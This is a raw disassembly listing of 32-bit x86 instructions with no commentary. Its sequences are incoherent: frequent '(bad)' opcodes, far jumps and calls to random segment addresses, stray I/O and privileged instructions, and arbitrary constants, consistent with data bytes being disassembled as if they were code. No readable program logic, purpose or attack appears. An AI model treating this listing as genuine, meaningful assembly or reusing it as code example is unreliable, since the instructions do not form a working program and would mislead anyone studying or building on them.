  420358:	cmp    dh,BYTE PTR [eax+0x6e]
  42035b:	sbb    eax,0xe4d8fbcc
  420360:	std    
  420361:	les    ebx,FWORD PTR [ebx-0x16f8832b]
  420367:	or     ebx,0xffffff87
  42036a:	mov    eax,DWORD PTR [ecx]
  42036c:	ss dec esp
  42036e:	shl    BYTE PTR [ecx-0x42b79fd4],1
  420374:	(bad)  
  420375:	mov    ds:0xac938ad6,eax
  42037a:	ja     0x420336
  42037c:	stos   BYTE PTR es:[edi],al
  42037d:	lock dec ecx
  42037f:	cld    
  420380:	xor    eax,0x6da5dc95
  420385:	fstp   DWORD PTR ds:0x3a78bb5c
  42038b:	(bad)  
  42038c:	adc    DWORD PTR [esi],esp
  42038e:	xor    bl,BYTE PTR [edx]
  420390:	stos   BYTE PTR es:[edi],al
  420391:	(bad)  
  420392:	xchg   esp,eax
  420393:	inc    edi
  420394:	jle    0x420390
  420396:	xor    BYTE PTR [edx],dh
  420398:	sar    BYTE PTR [esi+0x4136d6c9],cl
  42039e:	jmp    0x10bc:0x216dbaf3
  4203a5:	pop    ds
  4203a6:	adc    al,0x66
  4203a8:	inc    ebx
  4203a9:	xchg   edx,eax
  4203aa:	sub    dl,BYTE PTR [ebp-0x2056d60]
  4203b0:	popa   
  4203b1:	inc    eax
  4203b2:	inc    edi
  4203b3:	sub    BYTE PTR [eax+0x36b19cf8],ch
  4203b9:	pop    es
  4203ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203bb:	enter  0x5361,0x94
  4203bf:	jle    0x420379
  4203c1:	jle    0x42034c
  4203c3:	call   0x87b0:0x44443a99
  4203ca:	xchg   esp,eax
  4203cb:	int    0x73
  4203cd:	push   esp
  4203ce:	mov    ebp,DWORD PTR [ecx-0x5e]
  4203d1:	enter  0xa852,0x99
  4203d5:	inc    eax
  4203d6:	pop    ss
  4203d7:	lods   al,BYTE PTR ds:[esi]
  4203d8:	(bad)  
  4203d9:	xor    eax,0x4780dd9f
  4203de:	jno    0x420391
  4203e0:	imul   edx,DWORD PTR [eax],0x2c
  4203e3:	mov    BYTE PTR [ebp+edi*2+0x7fdc7aa7],ah
  4203ea:	icebp  
  4203eb:	pusha  
  4203ec:	cmp    eax,0x77a6c51f
  4203f1:	mov    WORD PTR [esi+0x553db4aa],fs
  4203f7:	inc    edx
  4203f8:	fcmovnu st,st(1)
  4203fa:	in     eax,0x2d
  4203fc:	mov    cl,0x5b
  4203fe:	push   edi
  4203ff:	cli    
  420400:	push   ds
  420401:	lock rol BYTE PTR [esi+esi*4-0x78e93777],0x51
  42040a:	xchg   edi,eax
  42040b:	mov    esp,0x4942d01f
  420410:	sbb    BYTE PTR [edx],al
  420412:	push   0x502e2d02
  420417:	or     eax,0x527f4d22
  42041c:	dec    ecx
  42041d:	fs push ecx
  42041f:	xor    DWORD PTR [eax],ecx
  420421:	imul   edx,DWORD PTR [edx],0x49ce5b4a
  420427:	sahf   
  420428:	adc    bl,BYTE PTR [ecx+0xe]
  42042b:	scas   eax,DWORD PTR es:[edi]
  42042c:	xchg   esp,eax
  42042d:	add    al,0xe5
  42042f:	pop    esp
  420430:	or     BYTE PTR [eax],0x6
  420433:	bound  eax,QWORD PTR [eax+0x7b]
  420436:	in     al,dx
  420437:	push   ds
  420438:	dec    ebp
  420439:	mov    cl,BYTE PTR [eax-0x3657489d]
  42043f:	popf   
  420440:	pusha  
  420441:	cmp    al,0x36
  420443:	cmc    
  420444:	pop    esi
  420445:	call   0xd6c6f913
  42044a:	imul   ebp,DWORD PTR [ebx-0x210e614a],0x2762639c
  420454:	(bad)  
  420455:	cli    
  420456:	pop    ebp
  420457:	cs push eax
  420459:	add    eax,0xaa34af9a
  42045e:	out    0xbf,al
  420460:	jg     0x4203e8
  420462:	xor    BYTE PTR [eax+0x6f350045],dh
  420468:	adc    bl,BYTE PTR [ecx-0x16e5ed63]
  42046e:	cmc    
  42046f:	pop    ebp
  420470:	shr    BYTE PTR [eax+0x7f20fce8],1
  420476:	test   al,0x0
  420478:	push   cs
  420479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42047a:	outs   dx,DWORD PTR ds:[esi]
  42047b:	mov    ch,0xc8
  42047d:	ins    BYTE PTR es:[edi],dx
  42047e:	stc    
  42047f:	xor    esp,DWORD PTR [bx+di]
  420482:	cli    
  420483:	mov    dh,0x34
  420485:	int3   
  420486:	sbb    edx,DWORD PTR [ebx+0x2c]
  420489:	or     cl,BYTE PTR [eax-0x6406bef0]
  42048f:	stos   DWORD PTR es:[edi],eax
  420490:	test   eax,0xf09903ff
  420495:	not    DWORD PTR [edx+0x242364af]
  42049b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42049c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42049d:	(bad)
  4204a1:	jmp    0x5a08:0x625f960
  4204a8:	cdq    
  4204a9:	imul   edi,esp,0xffffffd9
  4204ac:	icebp  
  4204ad:	std    
  4204ae:	and    esp,eax
  4204b0:	dec    esi
  4204b1:	jb     0x420479
  4204b3:	pusha  
  4204b4:	rcr    cl,1
  4204b6:	and    eax,0xc3a5ce2
  4204bb:	jg     0x4204e8
  4204bd:	popf   
  4204be:	adc    BYTE PTR [esi+0xb],bl
  4204c1:	js     0x4204ae
  4204c3:	sbb    BYTE PTR [ecx+0x64],cl
  4204c6:	sub    ch,ch
  4204c8:	enter  0x1deb,0xc9
  4204cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204cd:	mov    dh,0xd6
  4204cf:	add    ch,al
  4204d1:	push   0x41
  4204d3:	cld    
  4204d4:	inc    ebx
  4204d5:	out    dx,eax
  4204d6:	pop    ebp
  4204d7:	jnp    0x4204de
  4204d9:	dec    ebx
  4204da:	nop
  4204db:	(bad)  
  4204dc:	mov    ebp,0x279b64f2
  4204e1:	xchg   ecx,eax
  4204e2:	rcl    DWORD PTR [edx],0xcd
  4204e5:	mov    ecx,0x8b9fb5a4
  4204ea:	jg     0x42046e
  4204ec:	lahf   
  4204ed:	or     al,0xe9
  4204ef:	repnz cwde 
  4204f1:	mov    cl,BYTE PTR [ebx-0x47b6a1ca]
  4204f7:	nop
  4204f8:	inc    ebx
  4204f9:	stos   BYTE PTR es:[edi],al
  4204fa:	stos   DWORD PTR es:[edi],eax
  4204fb:	aad    0xaa
  4204fd:	shr    ch,1
  4204ff:	adc    eax,0x2a704cd4
  420504:	fistp  DWORD PTR [edx]
  420506:	mov    bh,0xde
  420508:	and    al,BYTE PTR [ecx+0x2cfe0bb5]
  42050e:	push   0x98d02360
  420513:	sub    WORD PTR ds:0x5f43404,di
  42051a:	xchg   DWORD PTR [edi],ebp
  42051c:	pop    ds
  42051d:	xor    eax,0x6d9bef09
  420522:	or     edx,esi
  420524:	jno    0x42053e
  420526:	dec    esp
  420527:	jb     0x4204e9
  420529:	jnp    0x420516
  42052b:	mov    eax,0x4d8836de
  420530:	or     BYTE PTR [ebx+0x2a],ah
  420533:	mov    ecx,0x76c57bc8
  420538:	and    ah,BYTE PTR [ebp-0x1c]
  42053b:	mov    eax,0x71c81d65
  420540:	addr16 rol ebp,cl
  420543:	add    BYTE PTR [ebx+0x4a],dl
  420546:	push   es
  420547:	mov    ch,0xcb
  420549:	or     al,0xf4
  42054b:	bound  edx,QWORD PTR [ecx+0x32742d4e]
  420551:	out    0xc8,eax
  420553:	sbb    al,0x93
  420555:	dec    ebp
  420556:	and    DWORD PTR [ecx],esi
  420558:	xchg   esi,eax
  420559:	(bad)
  42055d:	xor    DWORD PTR [eax+0x62bc1b0],esi
  420563:	and    ch,BYTE PTR [ecx+0x68]
  420566:	cmp    BYTE PTR [ecx],dh
  420568:	call   0x67f6b186
  42056d:	out    0x1a,eax
  42056f:	and    BYTE PTR [eax+0x7a],al
  420572:	xchg   ecx,eax
  420573:	fs push esi
  420575:	jo     0x4205ec
  420577:	pop    ecx
  420578:	mov    esp,0x7c65995
  42057d:	lock not BYTE PTR [ecx+0x2a]
  420581:	mov    ds:0xc04777c,al
  420586:	popf   
  420587:	inc    DWORD PTR [edi-0x7d]
  42058a:	aad    0x44
  42058c:	aam    0x91
  42058e:	jo     0x420548
  420590:	ror    BYTE PTR [edi+esi*4],0x40
  420594:	mov    ds:0x6a8d1306,eax
  420599:	xor    eax,0xebd3b1e1
  42059e:	or     BYTE PTR [edi-0xd9fcaca],ah
  4205a4:	push   edi
  4205a5:	push   ecx
  4205a6:	sbb    esi,DWORD PTR [esi*8+0x68381e0e]
  4205ad:	div    BYTE PTR [eax-0x313a348a]
  4205b3:	cmc    
  4205b4:	loope  0x4205dd
  4205b6:	or     al,0x44
  4205b8:	sub    eax,DWORD PTR [eax]
  4205ba:	bound  ebx,QWORD PTR [ecx-0x3424d3f]
  4205c0:	and    ebx,DWORD PTR [esi]
  4205c2:	cmc    
  4205c3:	add    al,0xca
  4205c5:	out    dx,eax
  4205c6:	popa   
  4205c7:	pop    es
  4205c8:	call   0x5e44:0xbf9f6ee6
  4205cf:	pop    esp
  4205d0:	mov    es,WORD PTR [edi]
  4205d2:	test   eax,0x83154b4
  4205d7:	pop    ecx
  4205d8:	adc    eax,0x771dae6b
  4205dd:	or     al,0x5e
  4205df:	push   ecx
  4205e0:	(bad)  
  4205e1:	cmp    dh,ah
  4205e3:	out    dx,eax
  4205e4:	or     eax,0xd7717de9
  4205e9:	stos   DWORD PTR es:[edi],eax
  4205ea:	or     bh,BYTE PTR [ecx-0x1981413a]
  4205f0:	add    esi,edx
  4205f2:	inc    edi
  4205f3:	outs   dx,DWORD PTR ds:[esi]
  4205f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205f5:	inc    edx
  4205f6:	cmp    cl,BYTE PTR [esi+0xf]
  4205f9:	xchg   BYTE PTR [ecx-0x80fb70c],al
  4205ff:	cmp    edx,DWORD PTR [esp+ebx*2-0x6f]
  420603:	ficomp DWORD PTR [esi-0x4]
  420606:	sub    eax,0x8814d11e
  42060b:	bound  ebx,QWORD PTR [ecx-0x4246c6f8]
  420611:	jmp    0x2ec3:0x9ec4e39c
  420618:	outs   dx,BYTE PTR ds:[esi]
  420619:	sub    BYTE PTR [edi],bl
  42061b:	cwde   
  42061c:	fwait
  42061d:	pushf  
  42061e:	xor    eax,esp
  420620:	dec    ebp
  420621:	stos   BYTE PTR es:[edi],al
  420622:	pop    ss
  420623:	test   al,0x60
  420625:	push   ss
  420626:	lahf   
  420627:	daa    
  420628:	inc    esp
  420629:	psllw  mm5,QWORD PTR [edi]
  42062c:	pop    ebp
  42062d:	mov    DWORD PTR [ebp+0x1488bb03],esi
  420633:	clc    
  420634:	mov    ecx,0xb45e4f94
  420639:	popa   
  42063a:	daa    
  42063b:	mov    ds:0xefc9ecc9,al
  420640:	icebp  
  420641:	test   BYTE PTR [edx+0x39],cl
  420644:	mov    al,ds:0x6c6e90f1
  420649:	in     al,0x16
  42064b:	es jnp 0x420654
  42064e:	push   esi
  42064f:	push   esi
  420650:	pop    ss
  420651:	std    
  420652:	jb     0x4206d3
  420654:	push   esp
  420655:	dec    esp
  420656:	cdq    
  420657:	pop    ds
  420658:	adc    al,0x98
  42065a:	mov    esp,0x2942f16b
  42065f:	mov    ss,esp
  420661:	pop    esp
  420662:	fdiv   QWORD PTR [ecx-0x73c90650]
  420668:	inc    ebp
  420669:	add    ebx,esp
  42066b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42066c:	adc    eax,0xe71d6084
  420671:	test   DWORD PTR [edx-0x1e733c72],edi
  420677:	xchg   esp,eax
  420678:	add    BYTE PTR [esi+0x521cb912],al
  42067e:	shl    DWORD PTR [eax-0xe],1
  420681:	xchg   edx,eax
  420682:	fdivr  QWORD PTR [ecx+0x11]
  420685:	or     al,BYTE PTR [ebx]
  420687:	pushf  
  420688:	inc    edi
  420689:	clc    
  42068a:	aam    0x9b
  42068c:	mov    bl,0xc8
  42068e:	lds    edi,FWORD PTR [edi]
  420690:	pop    es
  420691:	(bad)  
  420692:	shr    DWORD PTR [esi],cl
  420694:	adc    eax,0x986e025
  420699:	mov    al,ds:0x2d43ae5d
  42069e:	sahf   
  42069f:	ins    BYTE PTR es:[edi],dx
  4206a0:	loopne 0x420674
  4206a2:	icebp  
  4206a3:	cmp    eax,0xb167691c
  4206a8:	out    0x3d,al
  4206aa:	clc    
  4206ab:	xchg   esp,eax
  4206ac:	add    BYTE PTR [ebp-0x407148fb],al
  4206b2:	pushf  
  4206b3:	dec    edx
  4206b4:	fldenv [eax-0x1c9bb775]
  4206ba:	and    BYTE PTR [ebp+0x1e427204],al
  4206c0:	mov    esi,esi
  4206c2:	mov    ebx,eax
  4206c4:	sub    BYTE PTR [edi+0x7185681a],al
  4206ca:	imul   eax,DWORD PTR [ebx-0x45],0xd80e8611
  4206d1:	cmp    ch,al
  4206d3:	test   DWORD PTR [edx-0x278e8a53],eax
  4206d9:	mov    al,ds:0xdd2c3d76
  4206de:	xlat   BYTE PTR ds:[ebx]
  4206df:	dec    edi
  4206e0:	pmovmskb esi,mm4
  4206e3:	test   eax,0xf43a0ee1
  4206e8:	(bad)  
  4206e9:	mov    edi,0xd28e490f
  4206ee:	imul   esi,DWORD PTR [eax+0x3c60aab3],0xf799f70d
  4206f8:	(bad)  
  4206f9:	xlat   BYTE PTR ds:[ebx]
  4206fa:	lods   al,BYTE PTR ds:[esi]
  4206fb:	jbe    0x4206b4
  4206fd:	test   al,0x64
  4206ff:	cmp    al,0x2b
  420701:	push   eax
  420702:	lock loopne 0x420728
  420705:	jns    0x420772
  420707:	or     eax,0x78e83bbc
  42070c:	fist   DWORD PTR [edx+edi*8]
  42070f:	mov    bl,0x4b
  420711:	rol    BYTE PTR ds:0x64113685,0x73
  420718:	cmp    al,0x10
  42071a:	and    bl,BYTE PTR [edx]
  42071c:	inc    edx
  42071d:	mov    esi,0x4fdc5d61
  420722:	pop    ebp
  420723:	ds inc ebp
  420725:	mov    bl,0x36
  420727:	jne    0x4206e1
  420729:	mov    cl,0x2
  42072b:	jno    0x420761
  42072d:	fcom   DWORD PTR [eax+ebp*8]
  420730:	out    dx,eax
  420731:	jo     0x42071a
  420733:	popa   
  420734:	stc    
  420735:	in     al,dx
  420736:	fidiv  WORD PTR ds:0x9affff74
  42073c:	out    0xd2,eax
  42073e:	push   0x79bea76f
  420743:	jmp    0xfb5c:0xa9d9da43
  42074a:	and    eax,0x647bd02
  42074f:	push   esi
  420750:	sbb    DWORD PTR [edi+0xf6834d],0x627e4be8
  42075a:	call   0xd0d6:0xa684db03
  420761:	cmp    DWORD PTR [esi-0x5967034f],edi
  420767:	sbb    ebp,edx
  420769:	xor    ecx,edx
  42076b:	fwait
  42076c:	or     DWORD PTR [edx],ebx
  42076e:	jb     0x420706
  420770:	lds    ebp,FWORD PTR [esi-0xd]
  420773:	(bad)  
  420775:	sub    eax,0x5802770c
  42077a:	sub    BYTE PTR [esp+eiz*2],0x52
  42077e:	inc    ecx
  42077f:	xchg   BYTE PTR [edi+ecx*1-0x3238218d],dl
  420786:	aad    0x2
  420788:	(bad)  
  420789:	cli    
  42078a:	sbb    bh,BYTE PTR [ebp-0x2]
  42078d:	push   cs
  42078e:	sub    DWORD PTR [esi+eax*4],eax
  420791:	leave  
  420792:	lea    ebp,[ebp+0x42]
  420795:	pop    esi
  420796:	les    ecx,FWORD PTR [ebp-0x4f]
  420799:	and    esi,DWORD PTR [ebx+edx*1-0x6]
  42079d:	inc    ecx
  42079e:	sti    
  42079f:	jl     0x420738
  4207a1:	mov    dh,0x52
  4207a3:	imul   esp,DWORD PTR [edi],0xfffffff1
  4207a6:	sbb    DWORD PTR [ebx],esi
  4207a8:	scas   al,BYTE PTR es:[edi]
  4207a9:	push   esp
  4207aa:	push   ebp
  4207ab:	ficom  DWORD PTR [ecx]
  4207ad:	adc    bl,BYTE PTR [esi+0x27]
  4207b0:	test   esi,0xe9a87f80
  4207b6:	cmp    ah,BYTE PTR [esi-0x65]
  4207b9:	add    al,0x4b
  4207bb:	(bad)  
  4207bc:	xor    DWORD PTR [eax-0x3d],ebp
  4207bf:	xor    dh,BYTE PTR [esi-0x664c8a48]
  4207c5:	out    0x8a,eax
  4207c7:	and    BYTE PTR [esi-0x25c516ed],0x1
  4207ce:	iret   
  4207cf:	inc    eax
  4207d0:	(bad)  
  4207d1:	fdecstp 
  4207d3:	jns    0x4207d1
  4207d5:	mov    esp,0x41648d51
  4207da:	pop    eax
  4207db:	dec    ebp
  4207dc:	into   
  4207dd:	mov    ds:0x20506209,al
  4207e2:	cmp    eax,0xdbe2abcb
  4207e7:	mov    esi,0xbc81086d
  4207ec:	adc    esp,DWORD PTR [edi]
  4207ee:	sbb    BYTE PTR [esi+0x3e],bl
  4207f1:	int    0xce
  4207f3:	test   BYTE PTR [ecx-0x4d4933df],dl
  4207f9:	sbb    esp,DWORD PTR [esi+0x26ccb50b]
  4207ff:	xchg   ecx,eax
  420800:	mov    ah,0x5a
  420802:	sub    BYTE PTR [esi+ebp*1+0x36],0xdd
  420807:	xchg   esp,eax
  420808:	loope  0x42085e
  42080a:	mov    eax,ds:0x42b3cb25
  42080f:	add    al,0x40
  420811:	fdiv   DWORD PTR [esi+0x0]
  420814:	lea    ebx,[ecx-0x6de5ca85]
  42081a:	mov    ch,cl
  42081c:	in     al,dx
  42081d:	mov    bl,0x5d
  42081f:	adc    DWORD PTR [ebp-0x2dd71cfa],eax
  420825:	jmp    0x4207ec
  420827:	mov    BYTE PTR [esi-0x65bf96e4],ah
  42082d:	test   BYTE PTR [ebx],bl
  42082f:	dec    edi
  420830:	push   0x2e412f73
  420835:	cs mov ebx,0x209a08e8
  42083b:	xor    al,0x7a
  42083d:	ror    ebp,1
  42083f:	out    0xdd,al
  420841:	sub    al,0x67
  420843:	xchg   esi,eax
  420844:	gs and eax,0xefbcbedc
  42084a:	sbb    DWORD PTR [ebx+0x67],0x6c912efe
  420851:	adc    al,0x9
  420853:	jle    0x42085c
  420855:	sahf   
  420856:	mov    edi,0xc99e5fd4
  42085b:	jle    0x420882
  42085d:	aas    
  42085e:	mov    ecx,0xee7884e6
  420863:	popa   
  420864:	jo     0x42088d
  420866:	adc    ch,bl
  420868:	enter  0xf191,0xc
  42086c:	jl     0x4208b2
  42086e:	(bad)  
  420870:	es inc edx
  420872:	pop    ebx
  420873:	push   esp
  420874:	adc    edx,ebx
  420876:	mov    ds:0x87f35de6,eax
  42087b:	xor    eax,0xb629616e
  420880:	push   edi
  420881:	xlat   BYTE PTR ds:[ebx]
  420882:	dec    ebp
  420883:	xor    eax,ebx
  420885:	add    esi,DWORD PTR [eax-0x5e]
  420888:	(bad)  
  420889:	mov    dl,0x95
  42088b:	popf   
  42088c:	push   esi
  42088d:	and    eax,0x7779842f
  420892:	inc    ebx
  420893:	mov    ds:0x2a46e2f8,eax
  420898:	cli    
  420899:	xchg   DWORD PTR [ecx+0x31852453],edx
  42089f:	into   
  4208a0:	xchg   BYTE PTR [esi],ah
  4208a2:	lea    esp,[edx+0x53044e2]
  4208a8:	or     DWORD PTR [esi+0x5c],0xffffff96
  4208ac:	cmp    ch,BYTE PTR [ebx+0xe]
  4208af:	mov    bl,0x59
  4208b1:	(bad)  [eax]
  4208b3:	push   0xffffffaa
  4208b5:	xor    al,0xd3
  4208b7:	push   eax
  4208b8:	xchg   edx,eax
  4208b9:	ins    DWORD PTR es:[edi],dx
  4208ba:	sbb    al,0xb
  4208bc:	inc    ebp
  4208bd:	jae    0x420848
  4208bf:	or     BYTE PTR [edx],0xeb
  4208c2:	dec    ebx
  4208c3:	repz pusha 
  4208c5:	pop    es
  4208c6:	or     DWORD PTR [eax-0x45384072],ebx
  4208cc:	push   ebp
  4208cd:	leave  
  4208ce:	jmp    FWORD PTR [edi-0x37]
  4208d1:	mov    dh,0x50
  4208d3:	ss loopne 0x4208d8
  4208d6:	cdq    
  4208d7:	or     dl,BYTE PTR [ebx+0x66997fa7]
  4208dd:	dec    ecx
  4208de:	dec    edx
  4208df:	cs mov dh,dl
  4208e2:	jl     0x42094c
  4208e4:	add    eax,0x65ff8dfe
  4208e9:	ret    
  4208ea:	dec    esi
  4208eb:	loop   0x4208f9
  4208ed:	(bad)  
  4208ee:	mov    ah,0x8f
  4208f0:	inc    edi
  4208f1:	or     eax,DWORD PTR [ecx]
  4208f3:	sub    esp,DWORD PTR [edx+0x69ff5fbf]
  4208f9:	add    DWORD PTR ds:0x79ace54a,0xae6784f3
  420903:	imul   esp,DWORD PTR [eax-0xd],0xb75dae17
  42090a:	aad    0x6a
  42090c:	sbb    esp,DWORD PTR [edx]
  42090e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42090f:	scas   eax,DWORD PTR es:[edi]
  420910:	daa    
  420911:	fidiv  WORD PTR [esi]
  420913:	push   ecx
  420914:	or     esp,0x3c46a01c
  42091a:	xchg   edx,eax
  42091b:	ins    DWORD PTR es:[edi],dx
  42091c:	inc    esi
  42091d:	in     al,dx
  42091e:	mov    eax,0x25bd9aa8
  420923:	push   0xffffffac
  420925:	pop    ecx
  420926:	adc    BYTE PTR [ebp+esi*4+0x6d],cl
  42092a:	stos   BYTE PTR es:[edi],al
  42092b:	repnz xchg edi,eax
  42092d:	mov    bl,0xa8
  42092f:	mov    dh,0x32
  420931:	jns    0x4208e5
  420933:	add    eax,0x60e43a99
  420938:	jge    0x4209ac
  42093a:	stos   BYTE PTR es:[edi],al
  42093b:	fistp  DWORD PTR [eax+0x61619002]
  420941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420942:	sub    edi,esi
  420944:	test   BYTE PTR [edx],al
  420946:	(bad)  
  420947:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  420949:	jecxz  0x4208da
  42094b:	out    dx,eax
  42094c:	adc    edx,DWORD PTR ds:0x14d09923
  420952:	in     al,dx
  420953:	inc    edi
  420954:	dec    eax
  420955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420956:	pushf  
  420957:	adc    eax,0x146534ce
  42095c:	jb     0x4209c7
  42095e:	jns    0x42097b
  420960:	xchg   ecx,eax
  420961:	ins    DWORD PTR es:[edi],dx
  420962:	nop
  420963:	fistp  WORD PTR [edi+0x36]
  420966:	add    esi,DWORD PTR [edi+eax*1+0x5fd8a857]
  42096d:	icebp  
  42096e:	jo     0x4209e3
  420970:	or     al,0x83
  420972:	mov    eax,0x2451aa7c
  420977:	out    0x14,al
  420979:	clc    
  42097a:	sbb    al,0x9b
  42097c:	xchg   edi,eax
  42097d:	mov    bl,0x20
  42097f:	clc    
  420980:	jmp    DWORD PTR [eax+edi*1]
  420983:	mov    al,ds:0xbe967032
  420988:	test   eax,0xb58d2053
  42098d:	std    
  42098e:	in     al,0xd
  420990:	push   eax
  420991:	mov    al,0x29
  420993:	add    ch,BYTE PTR [edx+0x7f]
  420996:	mov    cl,0x2a
  420998:	retf   
  420999:	leave  
  42099a:	jmp    DWORD PTR [edx]
  42099d:	pop    esi
  42099e:	out    0x4c,eax
  4209a0:	scas   al,BYTE PTR es:[edi]
  4209a1:	and    eax,0x3112b2f
  4209a6:	xor    al,0xc2
  4209a8:	imul   DWORD PTR [ecx]
  4209aa:	jg     0x420a1a
  4209ac:	clc    
  4209ad:	inc    esi
  4209ae:	mov    ebx,0x338b3e01
  4209b3:	fisub  WORD PTR [eax]
  4209b5:	cmp    dh,BYTE PTR [edx]
  4209b7:	enter  0xede6,0x7
  4209bb:	jae    0x4209b5
  4209bd:	jp     0x4209e9
  4209bf:	mov    ch,BYTE PTR [esi]
  4209c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209c2:	mov    BYTE PTR [ecx-0x69a8e1eb],dl
  4209c8:	js     0x42095b
  4209ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209cb:	mov    dl,0xf3
  4209cd:	inc    esi
  4209ce:	jg     0x420a02
  4209d0:	in     eax,dx
  4209d1:	push   cs
  4209d2:	mov    bl,0x29
  4209d4:	and    cl,BYTE PTR [ebx]
  4209d6:	lahf   
  4209d7:	popf   
  4209d8:	push   es
  4209d9:	dec    ebx
  4209da:	push   0x67
  4209dc:	or     DWORD PTR gs:[esi-0x6332117c],esp
  4209e3:	or     ebx,DWORD PTR [eax]
  4209e5:	xor    ebp,edx
  4209e7:	stc    
  4209e8:	xor    DWORD PTR [edx+0x143f01a1],0xffffffb7
  4209ef:	mov    cl,0xfe
  4209f1:	mov    ch,0x3e
  4209f3:	xchg   esi,eax
  4209f4:	mov    eax,0x6a2c1fc0
  4209f9:	and    DWORD PTR [eax+0x5],edi
  4209fc:	xchg   edi,eax
  4209fd:	aad    0x3
  4209ff:	mov    eax,0x867da14
  420a04:	pop    ebx
  420a05:	int3   
  420a06:	sbb    eax,0x8aaee6a2
  420a0b:	rol    edi,1
  420a0d:	jecxz  0x4209c8
  420a0f:	cmp    eax,DWORD PTR [edx]
  420a11:	or     dl,BYTE PTR [eax+0x40]
  420a14:	mov    dl,0x45
  420a16:	fwait
  420a17:	fwait
  420a18:	nop
  420a19:	push   ds
  420a1a:	mov    ds:0x42179ab3,al
  420a1f:	push   0x1
  420a21:	ror    DWORD PTR [edx+ecx*4-0x25],cl
  420a25:	push   0x98980965
  420a2a:	push   edi
  420a2b:	in     al,0x94
  420a2d:	xor    DWORD PTR [eax-0x16a72f4c],0xffffffde
  420a34:	ja     0x420a31
  420a36:	aas    
  420a37:	sub    ecx,ebx
  420a39:	cmp    BYTE PTR [edi-0x4e],ah
  420a3c:	xchg   edx,eax
  420a3d:	cld    
  420a3e:	xlat   BYTE PTR ds:[ebx]
  420a3f:	mov    edx,0x5c4bab42
  420a44:	jae    0x420a71
  420a46:	ror    BYTE PTR [bx+di+0x13],1
  420a4a:	scas   eax,DWORD PTR es:[edi]
  420a4b:	outs   dx,BYTE PTR ds:[esi]
  420a4c:	mov    edx,0xa43fdb7
  420a51:	daa    
  420a52:	add    eax,0x7a6708a7
  420a57:	sub    ah,BYTE PTR [ecx-0x420bde85]
  420a5d:	or     ebp,DWORD PTR [ebp-0x2]
  420a60:	enter  0xff5c,0x72
  420a64:	fld    st(1)
  420a66:	push   eax
  420a67:	xchg   edi,eax
  420a68:	shl    BYTE PTR [eax+0x543c13c6],0x69
  420a6f:	out    dx,al
  420a70:	and    BYTE PTR [eax],bl
  420a72:	pop    eax
  420a73:	js     0x420aac
  420a75:	push   edx
  420a76:	imul   edi,DWORD PTR [eax+0x30e5f2e2],0xec5c8563
  420a80:	push   ebx
  420a81:	or     esp,edi
  420a83:	jecxz  0x420a46
  420a85:	and    al,0x1b
  420a87:	bnd jp 0x420a19
  420a8a:	data16 sub dl,bl
  420a8d:	fldcw  WORD PTR [eax]
  420a8f:	(bad)  
  420a90:	adc    al,0x25
  420a92:	xchg   esp,eax
  420a93:	addr16 jo 0x420ab1
  420a96:	xchg   ecx,eax
  420a97:	imul   ecx,DWORD PTR [ebx+0x6a0786d1],0x1ecb228b
  420aa1:	sub    ebp,DWORD PTR [esi]
  420aa3:	push   ecx
  420aa4:	adc    eax,0xd1eb9326
  420aa9:	xchg   BYTE PTR [ecx+ebp*8+0x20],ah
  420aad:	mov    ds:0xbf8a1846,eax
  420ab2:	xor    al,0xf0
  420ab4:	scas   al,BYTE PTR es:[edi]
  420ab5:	sti    
  420ab6:	sub    esi,DWORD PTR [ecx]
  420ab8:	cdq    
  420ab9:	xchg   esp,eax
  420aba:	mov    esi,0x755a552c
  420abf:	hlt    
  420ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ac1:	jl     0x420aea
  420ac3:	loopne 0x420aff
  420ac5:	push   ss
  420ac6:	(bad)  
  420ac8:	or     DWORD PTR [edi-0x764cf3d9],eax
  420ace:	sahf   
  420acf:	fwait
  420ad0:	outs   dx,BYTE PTR ds:[esi]
  420ad1:	lds    ecx,FWORD PTR [esp+ecx*8-0x4072ba62]
  420ad8:	mov    ?,ebp
  420ada:	pop    edi
  420adb:	xchg   edx,eax
  420adc:	cmp    al,0x19
  420ade:	mov    dl,0x3e
  420ae0:	xlat   BYTE PTR ds:[ebx]
  420ae1:	aaa    
  420ae2:	fadd   DWORD PTR [eax+edi*4+0x2469b92d]
  420ae9:	retf   
  420aea:	adc    DWORD PTR [esi+0x66c58189],edi
  420af0:	xchg   eax,edx
  420af2:	inc    ecx
  420af3:	scas   eax,DWORD PTR es:[edi]
  420af4:	nop
  420af5:	sub    al,0xfa
  420af7:	and    ebp,0x28679400
  420afd:	inc    eax
  420afe:	stos   DWORD PTR es:[edi],eax
  420aff:	hlt    
  420b00:	cmp    BYTE PTR [esi+edx*8],cl
  420b03:	rol    BYTE PTR [eax+ebp*2+0x32],0xdf
  420b08:	mul    BYTE PTR [edx]
  420b0a:	icebp  
  420b0b:	inc    ecx
  420b0c:	out    dx,eax
  420b0d:	out    0x39,al
  420b0f:	xchg   BYTE PTR [edi+edi*1],dh
  420b12:	dec    ch
  420b14:	mov    al,0xa
  420b16:	jb     0x420ac9
  420b18:	cmc    
  420b19:	pop    ebx
  420b1a:	outs   dx,BYTE PTR ds:[esi]
  420b1b:	push   esp
  420b1c:	adc    al,0xa9
  420b1e:	fdiv   DWORD PTR [eax+edi*1+0x3c]
  420b22:	xor    ch,BYTE PTR [ecx]
  420b24:	sti    
  420b25:	adc    esp,DWORD PTR [ebp-0x2a]
  420b28:	push   ebx
  420b29:	sbb    eax,0xeb8c041a
  420b2e:	jno    0x420ad2
  420b30:	lahf   
  420b31:	or     DWORD PTR [eax+0x70],ecx
  420b34:	cmp    DWORD PTR [edi-0x52],esp
  420b37:	test   al,0xa0
  420b39:	shl    BYTE PTR [esi-0x80],1
